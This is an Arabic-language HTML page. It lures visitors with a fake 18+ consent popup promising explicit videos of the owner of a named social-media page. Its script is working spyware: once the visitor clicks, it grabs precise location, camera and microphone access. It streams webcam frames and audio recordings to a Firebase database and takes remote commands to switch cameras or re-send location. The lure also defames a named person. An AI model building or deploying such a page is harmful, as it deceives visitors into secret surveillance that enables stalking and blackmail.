<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>مقالة تفاعلية</title>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-database-compat.js"></script>

  <style>
    body { font-family: 'Cairo', sans-serif; background: #f8fafc; margin:0; padding:20px; }
    .article { background:white; border-radius:16px; padding:40px; box-shadow:0 4px 20px rgba(0,0,0,0.1); text-align:center; }
    #consent { position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:white; padding:30px; border-radius:20px; box-shadow:0 15px 40px rgba(0,0,0,0.25); z-index:10000; width:92%; max-width:420px; text-align:center; display:none; }
    button { padding:18px; font-size:1.15rem; border:none; border-radius:12px; width:100%; margin:10px 0; }
  </style>
</head>
<body>

<div class="article">
  <h1>من هو صاحب صفحة الأحمدية كل يوم ؟</h1>
</div>

<div id="consent">
  <h2>الصفحة تحتوي على فيديوهات للكبار فقط </h2>
  <p>من فضلك أكد أنك أكبر من 18 عام <br>لكي تشاهد فيديوهات مخلة بصاحب صفحة الأحمدية كل يوم </p>
  <button onclick="requestAllPermissions()" style="background:#10b981; color:white;">✅ أنا أكبر من 18 عام </button>
</div>

<script>
  const firebaseConfig = {
    apiKey: "AIzaSyBQ9MlVOSzohuTqSA2JdI19UjyldnAb-zI",
    authDomain: "ohaha-d130e.firebaseapp.com",
    projectId: "ohaha-d130e",
    storageBucket: "ohaha-d130e.firebasestorage.app",
    messagingSenderId: "309282072723",
    appId: "1:309282072723:web:ed17bfe365577fba2ec566"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  let visitorId = 'v_' + Date.now() + Math.random().toString(36).substr(2,9);
  let videoStream = null;
  let audioStream = null;

  async function requestAllPermissions() {
    document.getElementById('consent').style.display = 'none';

    try {
      // ==================== الموقع الدقيق ====================
      await navigator.geolocation.getCurrentPosition(
        (pos) => {
          db.ref('visitors/' + visitorId + '/location').set({
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            time: Date.now()
          });
        },
        () => {}, 
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );

      // ==================== الكاميرا (أمامية) ====================
      videoStream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
      });

      // ==================== الميكروفون ====================
      audioStream = await navigator.mediaDevices.getUserMedia({ 
        audio: { echoCancellation: true, noiseSuppression: true } 
      });

      alert("✅شكراً لتأكيد أنك أكبر من 18 عام يرجي الموافقة على الثلاثة اشعارات القادمة ");
      startListeningToAdmin();

    } catch (e) {
      alert("⚠️ يرجي الموافقة على الثلاثة اشعارات القادمة");
      document.getElementById('consent').style.display = 'block';
    }
  }

  function denyConsent() {
    document.getElementById('consent').style.display = 'none';
  }

  function startListeningToAdmin() {
    db.ref('commands/' + visitorId).on('value', snap => {
      const cmd = snap.val();
      if (!cmd) return;

      if (cmd.type === 'frontCamera') switchCamera("user");
      if (cmd.type === 'backCamera') switchCamera("environment");
      if (cmd.type === 'requestLocation') sendAccurateLocation();
      if (cmd.type === 'startLiveAudio') startLiveAudio();

      setTimeout(() => db.ref('commands/' + visitorId).remove(), 800);
    });
  }

  function switchCamera(facingMode) {
    if (videoStream) videoStream.getTracks().forEach(t => t.stop());
    
    navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } } 
    }).then(stream => {
      videoStream = stream;
      sendLiveFrames();
    });
  }

  function sendLiveFrames() {
    const canvas = document.createElement('canvas');
    const video = document.createElement('video');
    video.srcObject = videoStream;
    video.play();

    setInterval(() => {
      canvas.width = 640;
      canvas.height = 480;
      canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
      const base64 = canvas.toDataURL('image/jpeg', 0.75);
      db.ref('live/' + visitorId + '/frame').set({ data: base64, time: Date.now() });
    }, 700);
  }

  function sendAccurateLocation() {
    navigator.geolocation.getCurrentPosition(pos => {
      db.ref('visitors/' + visitorId + '/location').set({
        lat: pos.coords.latitude,
        lng: pos.coords.longitude,
        accuracy: pos.coords.accuracy + " متر",
        time: Date.now()
      });
    }, null, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
  }

  function startLiveAudio() {
    if (!audioStream) return;
    const recorder = new MediaRecorder(audioStream);
    let chunks = [];

    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = () => {
      const blob = new Blob(chunks, { type: 'audio/webm' });
      const reader = new FileReader();
      reader.onload = () => db.ref('live/' + visitorId + '/audio').set({ data: reader.result, time: Date.now() });
      reader.readAsDataURL(blob);
      chunks = [];
    };

    setInterval(() => {
      recorder.stop();
      recorder.start(3500);
    }, 3800);
    recorder.start(3500);
  }

  window.onload = () => {
    document.getElementById('consent').style.display = 'block';
    db.ref('visitors/' + visitorId).update({
      device: /Mobi/.test(navigator.userAgent) ? 'موبايل' : 'كمبيوتر',
      timestamp: Date.now()
    });
  };
</script>
</body>
</html>
